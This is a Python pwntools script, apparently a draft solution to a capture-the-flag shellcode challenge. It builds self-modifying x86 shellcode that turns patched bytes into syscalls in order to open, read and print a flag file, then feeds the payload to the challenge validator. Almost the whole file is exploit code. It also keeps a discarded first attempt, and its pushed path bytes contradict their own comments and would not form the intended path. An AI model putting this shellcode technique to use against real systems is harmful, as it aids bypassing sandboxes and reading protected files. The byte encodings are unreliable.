#!/usr/bin/env python3
from pwn import *

base = 0x1337005
sc = b""

syscall1_offset = 90
syscall2_offset = 130
syscall3_offset = 170
syscall4_offset = 190

syscall1_addr = base + syscall1_offset
syscall2_addr = base + syscall2_offset
syscall3_addr = base + syscall3_offset
syscall4_addr = base + syscall4_offset

# Modify all syscall bytes
for addr in [syscall1_addr, syscall2_addr, syscall3_addr, syscall4_addr]:
    sc += b"\xb8" + p32(addr)
    sc += b"\x80\x00\x8d"
    sc += b"\x40"
    sc += b"\x80\x00\x40"

# open("/srv/app/flag", O_RDONLY)
# Push "/srv/app/flag\x00" in reverse
sc += b"\x68\x00\x00\x67\x00"      # push 0x00670000 (padding + "g\x00")
sc += asm("sub dword ptr [esp], 0x670000")  # subtract to get just null terminator
sc += b"\x68\x61\x6c\x66\x2f"      # push "/fla" (/fla in little endian: 2f666c61)

# Actually, let me just use a simpler approach:
sc = b""

# Modify syscalls
for addr in [syscall1_addr, syscall2_addr, syscall3_addr, syscall4_addr]:
    sc += b"\xb8" + p32(addr)
    sc += b"\x80\x00\x8d"
    sc += b"\x40"
    sc += b"\x80\x00\x40"

# Push path manually (correct little-endian)
sc += b"\x68\x67\x00\x00\x00"      # push 0x00000067 ("g\x00\x00\x00")
sc += b"\x68\x61\x6c\x66\x2f"      # push 0x2f666c61 ("/fla")
sc += b"\x68\x70\x70\x2f\x61"      # push 0x612f7070 ("a/pp")
sc += b"\x68\x76\x72\x73\x2f"      # push 0x2f737276 ("/srv")

sc += b"\x89\xe3"                   # mov ebx, esp
sc += b"\xb8\x05\x00\x00\x00"      # mov eax, 5
sc += b"\xb9\x00\x00\x00\x00"      # mov ecx, 0
sc += b"\xba\x00\x00\x00\x00"      # mov edx, 0

curr_len = len(sc)
sc += b"\xe9" + p32((syscall1_offset - curr_len - 5) & 0xffffffff)

while len(sc) < syscall1_offset:
    sc += b"\x40\x48"

sc += b"\x40\x40"

# read(fd, buf, 100)
sc += b"\x89\xc3"
sc += b"\xb8\x03\x00\x00\x00"
sc += b"\x89\xe1"
sc += b"\xba\x64\x00\x00\x00"

curr_len = len(sc)
sc += b"\xe9" + p32((syscall2_offset - curr_len - 5) & 0xffffffff)

while len(sc) < syscall2_offset:
    sc += b"\x40\x48"

sc += b"\x40\x40"

# write(1, buf, count)
sc += b"\x89\xc2"
sc += b"\xb8\x04\x00\x00\x00"
sc += b"\xbb\x01\x00\x00\x00"

curr_len = len(sc)
sc += b"\xe9" + p32((syscall3_offset - curr_len - 5) & 0xffffffff)

while len(sc) < syscall3_offset:
    sc += b"\x40\x48"

sc += b"\x40\x40"

# exit(0)
sc += b"\xb8\x01\x00\x00\x00"
sc += b"\xbb\x00\x00\x00\x00"

curr_len = len(sc)
sc += b"\xe9" + p32((syscall4_offset - curr_len - 5) & 0xffffffff)

while len(sc) < syscall4_offset:
    sc += b"\x40\x48"

sc += b"\x40\x40"

exit_loop_offset = len(sc)
sc += b"\xe9" + p32((syscall4_offset - exit_loop_offset - 5) & 0xffffffff)

print(f"Length: {len(sc)}")
print(f"Payload: {sc.hex()}")

import os
result = os.popen(f'echo "{sc.hex()}" | python chal.py 2>&1').read()
if "bad" in result.lower() or "jmp must be valid" in result:
    print("\nVALIDATION FAILED:")
    print(result)
else:
    print("\nValidation PASSED!")
